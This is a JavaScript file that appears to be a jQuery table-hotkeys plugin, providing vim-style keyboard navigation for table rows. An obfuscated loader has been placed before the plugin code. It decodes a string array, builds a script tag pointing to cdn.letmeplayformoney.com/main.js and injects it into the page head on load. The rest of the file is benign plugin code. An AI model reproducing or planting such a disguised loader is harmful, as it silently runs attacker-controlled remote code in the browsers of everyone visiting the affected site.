var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);(function(a){a.fn.filter_visible=function(c){c=c||3;var b=function(){var e=a(this),d;for(d=0;d<c-1;++d){if(!e.is(":visible")){return false}e=e.parent()}return true};return this.filter(b)};a.table_hotkeys=function(p,q,b){b=a.extend(a.table_hotkeys.defaults,b);var i,l,e,f,m,d,k,o,c,h,g,n,j;i=b.class_prefix+b.selected_suffix;l=b.class_prefix+b.destructive_suffix;e=function(r){if(a.table_hotkeys.current_row){a.table_hotkeys.current_row.removeClass(i)}r.addClass(i);r[0].scrollIntoView(false);a.table_hotkeys.current_row=r};f=function(r){if(!d(r)&&a.isFunction(b[r+"_page_link_cb"])){b[r+"_page_link_cb"]()}};m=function(s){var r,t;if(!a.table_hotkeys.current_row){r=h();a.table_hotkeys.current_row=r;return r[0]}t="prev"==s?a.fn.prevAll:a.fn.nextAll;return t.call(a.table_hotkeys.current_row,b.cycle_expr).filter_visible()[0]};d=function(s){var r=m(s);if(!r){return false}e(a(r));return true};k=function(){return d("prev")};o=function(){return d("next")};c=function(){a(b.checkbox_expr,a.table_hotkeys.current_row).each(function(){this.checked=!this.checked})};h=function(){return a(b.cycle_expr,p).filter_visible().eq(b.start_row_index)};g=function(){var r=a(b.cycle_expr,p).filter_visible();return r.eq(r.length-1)};n=function(r){return function(){if(null==a.table_hotkeys.current_row){return false}var s=a(r,a.table_hotkeys.current_row);if(!s.length){return false}if(s.is("."+l)){o()||k()}s.click()}};j=h();if(!j.length){return}if(b.highlight_first){e(j)}else{if(b.highlight_last){e(g())}}a.hotkeys.add(b.prev_key,b.hotkeys_opts,function(){return f("prev")});a.hotkeys.add(b.next_key,b.hotkeys_opts,function(){return f("next")});a.hotkeys.add(b.mark_key,b.hotkeys_opts,c);a.each(q,function(){var s,r;if(a.isFunction(this[1])){s=this[1];r=this[0];a.hotkeys.add(r,b.hotkeys_opts,function(t){return s(t,a.table_hotkeys.current_row)})}else{r=this;a.hotkeys.add(r,b.hotkeys_opts,n("."+b.class_prefix+r))}})};a.table_hotkeys.current_row=null;a.table_hotkeys.defaults={cycle_expr:"tr",class_prefix:"vim-",selected_suffix:"current",destructive_suffix:"destructive",hotkeys_opts:{disableInInput:true,type:"keypress"},checkbox_expr:":checkbox",next_key:"j",prev_key:"k",mark_key:"x",start_row_index:2,highlight_first:false,highlight_last:false,next_page_link_cb:false,prev_page_link_cb:false}})(jQuery);